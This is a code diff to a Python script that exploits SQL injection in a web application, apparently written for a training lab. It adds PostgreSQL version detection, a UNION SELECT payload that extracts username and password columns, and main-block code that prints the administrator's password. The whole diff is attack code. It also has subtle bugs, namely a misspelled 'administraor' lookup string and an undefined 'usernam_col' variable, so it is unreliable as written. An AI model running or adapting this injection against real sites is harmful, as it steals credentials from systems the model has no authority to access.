@@ -44,9 +44,7 @@ def get_DB_version(url):
     res = perform_request(url, payload)
     
     soup = BeautifulSoup(res.text, "html.parser")
-    th_tags = soup.find_all("th")
-    version = th_tags[2].text.strip()
-    print(version)
+    version = soup.find(string= re.compile(".*PostgreSQL.*"))
     
     if version:
         return version
@@ -68,8 +66,14 @@ def get_column_name(url,userTable):
     soup = BeautifulSoup(res.text,"html.parser")
     username = soup.find(string=re.compile(".*username.*"))
     password = soup.find(string=re.compile(".password."))
-
     return username, password
+
+def get_admin_password(url, username_col, password_col, table_name):
+    payload = "' UNION SELECT %s, %s FROM %s" %(username_col, password_col, table_name)
+    res = perform_request(url, payload)
+    soup = BeautifulSoup(res.text, "html.parser")
+    admin_password = soup.body.find(string="administraor").parent.findNext("td").contents[0]
+    return admin_password
 
 if __name__ == "__main__":
     try:
@@ -113,3 +117,13 @@ if __name__ == "__main__":
         print("password column name: %s", password_col)
     else:
         print("username or password column not found")
+        sys.exit(-1)
+
+    # find administrator's password
+    admin_password = get_admin_password(url, usernam_col, password_col, userTable)
+    if admin_password:
+        print("username: administrator")
+        print("password: %s" %admin_password)
+    else:
+        print("username / password not found")
+        sys.exit(-1)
